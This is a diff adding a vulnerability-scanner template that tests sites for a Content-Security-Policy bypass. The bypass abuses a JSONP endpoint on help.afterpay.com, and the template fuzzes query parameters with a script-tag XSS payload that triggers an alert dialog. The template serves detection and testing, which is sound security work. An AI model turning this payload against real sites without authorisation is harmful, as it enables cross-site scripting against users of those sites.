@@ -1,0 +1,55 @@
+id: afterpay-help-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Afterpay Help
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,afterpay-help
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "afterpay.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: afterpay_help_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://help.afterpay.com/sc/faye/?message=[{%22channel%22:%22%22}]&jsonp=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "afterpay_help_csp_xss == true"
+# digest: 490a00463044022062a0015429f6d64d7b4c9020cba15edc7d437a346d1e1c376acc241f1181248e022042a237ad36e18e7c996fa2dbe780a40fc620beefc18223ce580ae8f9d05d8730:922c64590222798bb761d5b6d8e72950
